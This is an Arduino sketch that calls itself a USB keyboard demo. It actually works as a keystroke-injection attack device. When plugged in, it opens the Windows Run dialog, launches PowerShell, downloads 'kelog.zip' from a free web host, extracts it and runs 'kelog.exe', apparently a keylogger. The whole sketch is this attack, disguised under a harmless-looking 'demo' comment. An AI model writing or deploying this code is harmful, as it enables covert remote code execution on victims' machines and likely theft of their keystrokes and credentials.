

/* Arduino USB Keyboard HID demo */
#include <HIDKeyboard.h>
HIDKeyboard keyboard;

uint8_t buf[8] = { 0 }; /* Keyboard report buffer */

void setup();
void loop();

#define KEY_LEFT_GUI 0x08
#define KEY_R 21
#define KEY_SPACEBAR 0x2c
/*
#define KEY_ENTER 40

#define KEY_LEFT_CTRL   0x80
#define KEY_LEFT_SHIFT    0x81
#define KEY_LEFT_ALT    0x82
#define KEY_LEFT_GUI    0x83
#define KEY_RIGHT_CTRL    0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT   0x86
#define KEY_RIGHT_GUI   0x87
*/
void setup()
{
Serial.begin(9600);
delay(200);
}

void loop()
{
buf[0] = KEY_LEFT_GUI;
buf[2] = KEY_R;

Serial.write(buf, 8); // Send GUI+R keypress
buf[0] = 0;
buf[2] = 0;
Serial.write(buf, 8); // Release key
delay(200);
keyboard.println("powershell");
delay(1000);
keyboard.println("wget 'https://wandapandakandabatata.000webhostapp.com/kelog.zip' -o kelog.zip");
delay(10000);
keyboard.println("Expand-Archive .\\kelog.zip -DestinationPath kelog");
keyboard.println("cd kelog");
keyboard.println(".\\kelog.exe");
keyboard.println("exit");


//buf[0] = KEY_SPACEBAR;
//delay(10000);  
//Serial.write(buf, 8);
//buf[0] = 0;
//Serial.write(buf, 8);

delay(10000000);
}
